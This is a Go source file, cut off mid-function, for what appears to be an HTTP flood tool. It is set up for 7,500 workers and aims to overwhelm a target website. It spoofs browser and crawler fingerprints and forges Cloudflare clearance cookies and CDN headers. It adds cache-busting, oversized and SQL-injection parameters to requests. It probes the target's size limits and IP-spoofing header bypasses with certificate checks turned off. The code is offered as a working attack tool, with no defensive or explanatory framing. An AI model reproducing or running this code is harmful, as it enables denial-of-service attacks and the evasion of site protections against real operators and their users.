package main

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"context"
	"crypto/tls"
	cryptorand "crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

const (
	HAPUS  = "\033[0m"
	MERAH  = "\033[31m"
	IJO    = "\033[32m"
	PUTIH  = "\033[37m"
	CANDY  = "\033[91m"
	PUCAT  = "\033[38;5;203m"
	PUNYAMU = "\033[38;5;204m"
	PUNYA_LU_PUCAT = "\033[38;5;218m"
	MASA_DEPAN_NYA = "\033[97m"
)

const (
	WORKER_COUNT = 7500
	TIMEOUT      = 6 * time.Second
	KEEP_ALIVE   = 30 * time.Second
)

type BPF struct {
	UA           string
	Accept       string
	Lang         string
	Encoding     string
	SecChUa      string
	SecChUaMov   string
	SecChUaPlat  string
	SecFetchSite string
	SecFetchMode string
	SecFetchDest string
	Referer      string
	Origin       string
	DNT          string
}

var PFS = []BPF{
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "macOS",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?1",
		SecChUaPlat:  "Android",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.bing.com/search?q=",
		Origin:       "https://www.bing.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
}

var cacheParams = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
var cookieNames = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
var botUAs = []string{
	"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
	"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
}

type ProbeResult struct {
	MaxPayload          int
	MaxHeader           int
	SupportedHeaders    map[string]bool
	HTTPVersion         string
	ValidOrigins        []string
	ValidUserAgents     []string
	ValidReferers       []string
	ValidMethods        []string
	ValidEncodings      []string
	ValidCacheControls  []string
	SupportsWebSocket   bool
	SupportsGRPC        bool
	SupportsRange       bool
	SupportsCompression bool
	SupportsMultipart   bool
	SupportsJSON        bool
	SupportsReDOS       bool
	SupportsCookies     bool
	SupportsSession     bool
	SupportsKeepAlive   bool
	SupportsHTTP2Push   bool
	SupportsPing        bool
	SupportsSettings    bool
	SupportsWindowUpdate bool
	MaxConcurrentStreams int
	InitialWindowSize   int
	MaxFrameSize        int
	HeaderTableSize     int
}

var probeResult ProbeResult
var globalCookie string

func randIP(rng *rand.Rand) string {
	return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
}

func randStr(rng *rand.Rand, n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

func randHex(n int) string {
	b := make([]byte, n)
	if _, err := cryptorand.Read(b); err != nil {
		return randStr(rand.New(rand.NewSource(time.Now().UnixNano())), n*2)[:n]
	}
	return hex.EncodeToString(b)[:n]
}

func generateBypassCookie() string {
	ts := time.Now().Unix()
	return fmt.Sprintf("cf_clearance=%s_%d-1.2.1.1-%s", randHex(22), ts, randHex(6))
}

func randomElement(arr []string) string {
	if len(arr) == 0 {
		return ""
	}
	return arr[rand.Intn(len(arr))]
}

func RST(rng *rand.Rand, length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

func randUnicode(rng *rand.Rand, n int) string {
	unicodes := []string{
		"\u03B1", "\u03B2", "\u03B3", "\u03B4", "\u03B5",
		"\u03B6", "\u03B7", "\u03B8", "\u03B9", "\u03BA",
		"\u03BB", "\u03BC", "\u03BD", "\u03BE", "\u03BF",
		"\u0440", "\u0441", "\u0442", "\u0443", "\u0444",
		"\u0445", "\u0446", "\u0447", "\u0448", "\u0449",
		"\u0430", "\u0431", "\u0432", "\u0433", "\u0434",
	}
	result := ""
	for i := 0; i < n; i++ {
		result += unicodes[rng.Intn(len(unicodes))]
	}
	return result
}

func randSpecial(rng *rand.Rand, n int) string {
	specials := "!@#$%^&*()_+-=[]{}|;:'\",.<>?/`~"
	b := make([]byte, n)
	for i := range b {
		b[i] = specials[rng.Intn(len(specials))]
	}
	return string(b)
}

func generateCacheBypassParams(target string, rng *rand.Rand, maxPayload int, result *ProbeResult) string {
	parsed, _ := url.Parse(target)
	path := parsed.Path
	if path == "" {
		path = "/"
	}

	params := []string{}
	params = append(params, "_="+strconv.FormatInt(time.Now().UnixNano(), 10))
	params = append(params, "t="+strconv.FormatInt(time.Now().Unix(), 10))

	cacheKeys := []string{
		"cb", "rnd", "cache", "v", "ver", "version",
		"ts", "time", "timestamp", "date", "datetime",
		"q", "s", "page", "id", "rand", "random",
		"nocache", "bypass", "fresh", "new", "latest",
		"rev", "revision", "hash", "md5", "sha1",
		"cachebuster", "buster", "purge", "flush",
		"reload", "refresh", "renew", "update",
	}

	for j := 0; j < 2+rng.Intn(4); j++ {
		key := cacheKeys[rng.Intn(len(cacheKeys))]
		val := strconv.FormatInt(rng.Int63(), 10)
		if rng.Intn(2) == 0 {
			val = randHex(8)
		}
		if rng.Intn(3) == 0 {
			val = RST(rng, 12)
		}
		params = append(params, key+"="+val)
	}

	if rng.Intn(3) == 0 {
		key := cacheKeys[rng.Intn(len(cacheKeys))]
		val1 := strconv.FormatInt(rng.Int63(), 10)
		val2 := strconv.FormatInt(rng.Int63(), 10)
		params = append(params, key+"="+val1)
		params = append(params, key+"="+val2)
	}

	if rng.Intn(5) == 0 {
		params = append(params, randStr(rng, 4)+"=")
	}

	if rng.Intn(4) == 0 {
		key := url.QueryEscape(randStr(rng, 4))
		val := url.QueryEscape(randStr(rng, 8))
		params = append(params, key+"="+val)
	}

	if rng.Intn(6) == 0 {
		params = append(params, "unicode="+randUnicode(rng, 5))
	}

	if maxPayload > 0 && rng.Intn(3) == 0 {
		size := maxPayload/2 + rng.Intn(maxPayload/2)
		if size < 1 {
			size = 64
		}
		params = append(params, "big="+strings.Repeat("x", size))
	}

	if rng.Intn(5) == 0 {
		params = append(params, randStr(rng, 8)+"="+strings.Repeat("x", 100+rng.Intn(500)))
	}

	if rng.Intn(10) == 0 {
		params = append(params, "../"+randStr(rng, 4)+"="+randStr(rng, 8))
	}

	if rng.Intn(15) == 0 {
		params = append(params, "id="+strconv.Itoa(rng.Intn(1000))+"' OR '1'='1")
	}

	if rng.Intn(8) == 0 {
		params = append(params, "json="+url.QueryEscape(`{"`+randStr(rng, 4)+`":"`+randStr(rng, 8)+`"}`))
	}

	if rng.Intn(5) == 0 {
		arr := []string{}
		for j := 0; j < 1+rng.Intn(3); j++ {
			arr = append(arr, randStr(rng, 4))
		}
		params = append(params, "arr[]="+strings.Join(arr, ","))
	}

	if rng.Intn(3) == 0 {
		key := randStr(rng, 4)
		if rng.Intn(2) == 0 {
			key = strings.ToUpper(key)
		}
		params = append(params, key+"="+strconv.FormatInt(rng.Int63(), 10))
	}

	if rng.Intn(5) == 0 {
		params = append(params, randStr(rng, 20)+"="+randStr(rng, 10))
	}

	if rng.Intn(4) == 0 {
		params = append(params, randStr(rng, 4)+"="+randSpecial(rng, 6))
	}

	if rng.Intn(6) == 0 {
		params = append(params, "hash="+randHex(32))
		params = append(params, "md5="+randHex(32))
		params = append(params, "sha1="+randHex(40))
	}

	var finalURL string
	if strings.Contains(target, "?") {
		finalURL = target + "&" + strings.Join(params, "&")
	} else {
		finalURL = target + "?" + strings.Join(params, "&")
	}

	if rng.Intn(3) == 0 {
		u, _ := url.Parse(finalURL)
		path := u.Path
		switch rng.Intn(4) {
		case 0:
			if !strings.HasSuffix(path, "/") {
				path += "/"
			}
			path += randStr(rng, 4) + "/" + randStr(rng, 4)
		case 1:
			path = strings.Replace(path, "/", "//", 1)
		case 2:
			path = strings.Replace(path, "/", "%2F", -1)
		case 3:
			path = strings.Replace(path, "/", "/\u2215", -1)
		}
		u.Path = path
		finalURL = u.String()
	}

	if rng.Intn(10) == 0 {
		finalURL += "#" + randStr(rng, 8)
	}

	if rng.Intn(15) == 0 {
		u, _ := url.Parse(finalURL)
		u.User = url.UserPassword(randStr(rng, 4), randStr(rng, 8))
		finalURL = u.String()
	}

	return finalURL
}

func generateCacheHeaders(rng *rand.Rand) map[string]string {
	headers := make(map[string]string)

	cacheControls := []string{
		"no-cache, no-store, must-revalidate, max-age=0",
		"max-age=0, no-cache, no-store, must-revalidate",
		"no-store, no-cache, must-revalidate, proxy-revalidate",
		"no-cache, must-revalidate, proxy-revalidate, max-age=0",
		"private, no-cache, no-store, must-revalidate",
		"no-cache, no-store, must-revalidate, max-age=0, s-maxage=0",
		"max-age=0, s-maxage=0, no-cache, no-store",
		"no-cache, no-store, max-age=0, must-revalidate, proxy-revalidate",
	}
	headers["Cache-Control"] = cacheControls[rng.Intn(len(cacheControls))]

	if rng.Intn(2) == 0 {
		headers["Pragma"] = "no-cache"
	}
	headers["Expires"] = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)

	if rng.Intn(3) == 0 {
		headers["If-Modified-Since"] = time.Now().AddDate(-2, 0, 0).Format(time.RFC1123)
	}
	if rng.Intn(2) == 0 {
		headers["If-None-Match"] = `"` + randHex(16) + `"`
	}
	if rng.Intn(5) == 0 {
		headers["If-Unmodified-Since"] = time.Now().AddDate(1, 0, 0).Format(time.RFC1123)
	}
	if rng.Intn(10) == 0 {
		headers["If-Range"] = `"` + randHex(16) + `"`
	}
	if rng.Intn(10) == 0 {
		headers["If-Match"] = `"` + randHex(16) + `"`
	}
	if rng.Intn(3) == 0 {
		headers["Vary"] = randomElement([]string{
			"Accept-Encoding, User-Agent",
			"Accept-Encoding, Accept-Language",
			"User-Agent, Accept-Encoding",
			"*",
		})
	}
	if rng.Intn(4) == 0 {
		headers["X-Cache-Status"] = randomElement([]string{
			"BYPASS", "DYNAMIC", "EXPIRED", "MISS",
			"REFRESH", "PURGE", "FLUSH", "RELOAD",
		})
	}
	if rng.Intn(5) == 0 {
		headers["X-Cache-Key"] = randHex(16)
	}
	if rng.Intn(3) == 0 {
		headers["X-Cache-Buster"] = strconv.FormatInt(time.Now().UnixNano(), 10)
	}
	if rng.Intn(10) == 0 {
		headers["X-Purge-Cache"] = "true"
	}
	if rng.Intn(3) == 0 {
		headers["CF-Cache-Status"] = randomElement([]string{
			"BYPASS", "DYNAMIC", "EXPIRED", "HIT", "MISS",
			"REVALIDATED", "UPDATING", "STALE",
		})
	}
	if rng.Intn(4) == 0 {
		headers["CF-RAY"] = randHex(16) + "-" + randomElement([]string{"FRA", "AMS", "LHR", "CDG", "SIN", "NRT"})
	}
	if rng.Intn(5) == 0 {
		headers["X-Akamai-Translated"] = randomElement([]string{"true", "false"})
	}
	if rng.Intn(5) == 0 {
		headers["Fastly-Cache-Status"] = randomElement([]string{
			"HIT", "MISS", "BYPASS", "DYNAMIC", "EXPIRED",
		})
	}
	if rng.Intn(10) == 0 {
		headers["Surrogate-Cache-Control"] = "no-store, no-cache"
	}
	if rng.Intn(5) == 0 {
		headers["Age"] = "0"
	}
	if rng.Intn(8) == 0 {
		headers["X-Cache-Date"] = time.Now().Format(time.RFC1123)
	}
	if rng.Intn(6) == 0 {
		headers["X-Cache-Timestamp"] = strconv.FormatInt(time.Now().Unix(), 10)
	}
	if rng.Intn(3) == 0 {
		headers["X-Cache"] = randomElement([]string{
			"BYPASS", "PURGE", "REFRESH", "FLUSH", "RELOAD",
		})
	}
	if rng.Intn(4) == 0 {
		headers["X-Cache-Control"] = "bypass"
	}
	if rng.Intn(5) == 0 {
		headers["X-No-Cache"] = "true"
	}
	if rng.Intn(5) == 0 {
		headers["X-Proxy-Cache"] = "BYPASS"
	}
	if rng.Intn(6) == 0 {
		headers["X-Edge-Cache"] = "BYPASS"
	}

	return headers
}

func probeMaxPayload(target string) int {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768}
	best := 0
	for _, sz := range sizes {
		u := target
		if strings.Contains(u, "?") {
			u += "&big=" + strings.Repeat("x", sz)
		} else {
			u += "?big=" + strings.Repeat("x", sz)
		}
		req, _ := http.NewRequest("GET", u, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently || resp.StatusCode == http.StatusSeeOther {
			best = sz
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestURITooLong || resp.StatusCode == 413 {
			break
		} else {
			break
		}
	}
	return best
}

func probeMaxHeader(target string) int {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{512, 1024, 2048, 4096, 8192, 16384, 32768, 65536}
	best := 0
	for _, sz := range sizes {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("X-Large-Data", strings.Repeat("x", sz))
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently || resp.StatusCode == http.StatusSeeOther {
			best = sz
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == 413 || resp.StatusCode == 431 {
			break
		} else {
			break
		}
	}
	return best
}

func probeHeaderBypass(target, proxyIP string) map[string]bool {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	if proxyIP == "" {
		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
		proxyIP = randIP(rng)
	}

	headers := []string{
		"X-Forwarded-For", "X-Forwarded", "Forwarded-For", "X-Real-IP",
		"X-Originating-IP", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP",
		"X-Host", "X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL",
		"X-Proxy-URL", "X-Proxy-Host", "CF-Connecting-IP", "True-Client-IP",
		"CDN-Loop", "X-CDN", "X-CDN-IP", "X-CDN-Client-IP", "CF-IPCountry",
		"CF-Ray", "CF-Visitor", "CF-Worker", "CF-Edge-IP", "X-Akamai-Translated",
		"X-Akamai-Client-IP", "Fastly-Client-IP", "Fastly-Orig-IP",
		"X-Request-ID", "X-Request-Id", "X-Correlation-ID", "X-Session-ID",
		"X-Trace-ID", "X-Forwarded-Protocol", "X-Forwarded-Scheme",
		"X-Original-Host", "X-Backend-Host", "X-Server-IP", "X-Cluster-IP",
		"X-Gateway-IP", "X-Proxy-IP", "X-LB-IP", "X-Edge-IP", "X-Source-IP",
		"X-Destination-IP", "X-HTTP-Method-Override", "X-Method-Override",
		"X-Cache-Bypass", "X-Cache-Status", "X-Cache-Key", "X-Compression-Hint",
		"X-Accept-Encoding", "X-Forwarded-User", "X-Forwarded-Agent",
		"X-Forwarded-Proto",
	}

	result := make(map[string]bool)
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))

	for _, h := range headers {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")

		switch h {
		case "X-Forwarded-For":
			req.Header.Set("X-Forwarded-For", proxyIP+", "+randIP(rng)+", "+randIP(rng))
		case "X-Forwarded":
			req.Header.Set("X-Forwarded", "for="+proxyIP)
		case "Forwarded-For":
			req.Header.Set("Forwarded-For", proxyIP)
		case "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP":
			req.Header.Set(h, proxyIP)
		case "X-Host", "X-Forwarded-Host", "X-Original-Host", "X-Backend-Host":
			req.Header.Set(h, host)
		case "X-Original-URL", "X-Rewrite-URL":
			req.Header.Set(h, "/"+randStr(rng, 8))
		case "X-Proxy-URL":
			req.Header.Set("X-Proxy-URL", target)
		case "X-Proxy-Host":
			req.Header.Set("X-Proxy-Host", host)
		case "CF-Connecting-IP", "True-Client-IP", "X-CDN-IP", "X-CDN-Client-IP", "X-Akamai-Client-IP", "Fastly-Client-IP", "Fastly-Orig-IP":
			req.Header.Set(h, proxyIP)
		case "CDN-Loop", "X-CDN":
			req.Header.Set(h, "cloudflare")
		case "CF-IPCountry":
			req.Header.Set("CF-IPCountry", randomElement([]string{"US", "GB", "DE", "FR", "JP", "AU", "CA", "ID", "SG"}))
		case "CF-Ray":
			req.Header.Set("CF-Ray", randHex(16)+"-"+randomElement([]string{"FRA", "AMS", "LHR", "CDG", "SIN", "NRT"}))
		case "CF-Visitor":
			req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
		case "CF-Worker":
			req.Header.Set("CF-Worker", randStr(rng, 16))
		case "CF-Edge-IP", "X-Server-IP", "X-Cluster-IP", "X-Gateway-IP", "X-Proxy-IP", "X-LB-IP", "X-Edge-IP", "X-Source-IP", "X-Destination-IP":
			req.Header.Set(h, proxyIP)
		case "X-Akamai-Translated":
			req.Header.Set("X-Akamai-Translated", "true")
		case "X-Request-ID", "X-Request-Id":
			req.Header.Set(h, strconv.FormatInt(rng.Int63(), 16))
		case "X-Correlation-ID", "X-Session-ID", "X-Trace-ID", "X-Cache-Key":
			req.Header.Set(h, randHex(16))
		case "X-Forwarded-Protocol", "X-Forwarded-Scheme", "X-Forwarded-Proto":
			req.Header.Set(h, "https")
		case "X-HTTP-Method-Override", "X-Method-Override":
			req.Header.Set(h, randomElement([]string{"PUT", "DELETE", "PATCH", "OPTIONS"}))
		case "X-Cache-Bypass":
			req.Header.Set("X-Cache-Bypass", randHex(8))
		case "X-Cache-Status":
			req.Header.Set("X-Cache-Status", randomElement([]string{"BYPASS", "DYNAMIC", "EXPIRED", "HIT", "MISS"}))
		case "X-Compression-Hint":
			req.Header.Set("X-Compression-Hint", "gzip")
		case "X-Accept-Encoding":
			req.Header.Set("X-Accept-Encoding", "gzip, deflate, br")
		case "X-Forwarded-User":
			req.Header.Set("X-Forwarded-User", randStr(rng, 8))
		case "X-Forwarded-Agent":
			req.Header.Set("X-Forwarded-Agent", "Mozilla/5.0")
		}

		resp, err := client.Do(req)
		if err != nil {
			result[h] = false
			continue
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound ||
			resp.StatusCode == http.StatusMovedPermanently || resp.StatusCode == http.StatusSeeOther {
			result[h] = true
		} else {
			result[h] = false
		}
	}
	return result
}

func probeHTTPVersion(target string) string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	conn, err := tls.Dial("tcp", net.JoinHostPort(host, "443"), &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2", "http/1.1"},
	})
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	proto := conn.ConnectionState().NegotiatedProtocol
	if proto == "h2" {
		return "H2"
	} else if proto == "http/1.1" {
		return "H1"
	}
	return "H3"
}

func probeOrigins(target string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	candidates := []string{
		"https://" + host,
		"https://www.google.com",
		"https://www.bing.com",
		"https://www.yahoo.com",
		"",
	}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, o := range candidates {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if o != "" {
			req.Header.Set("Origin", o)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, o)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host)
	}
	return valid
}

func probeUserAgents(target string) []string {
	testUAs := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, ua := range testUAs {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", ua)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, ua)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, testUAs[0])
	}
	return valid
}

func probeReferers(target string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	candidates := []string{
		"https://" + host + "/",
		"https://www.google.com/search?q=" + host,
		"https://www.bing.com/search?q=" + host,
		"https://www.yahoo.com/search?p=" + host,
		"",
	}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, r := range candidates {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if r != "" {
			req.Header.Set("Referer", r)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, r)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host+"/")
	}
	return valid
}

func probeMethods(target string) []string {
	methods := []string{"GET", "POST", "OPTIONS", "PUT", "DELETE", "PATCH", "HEAD", "TRACE"}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, m := range methods {
		var body io.Reader
		if m == "POST" || m == "PUT" || m == "PATCH" {
			body = strings.NewReader("")
		}
		req, _ := http.NewRequest(m, target, body)
		if m == "POST" || m == "PUT" || m == "PATCH" {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, m)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "GET")
	}
	return valid
}

func probeEncodings(target string) []string {
	encs := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity"}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, e := range encs {
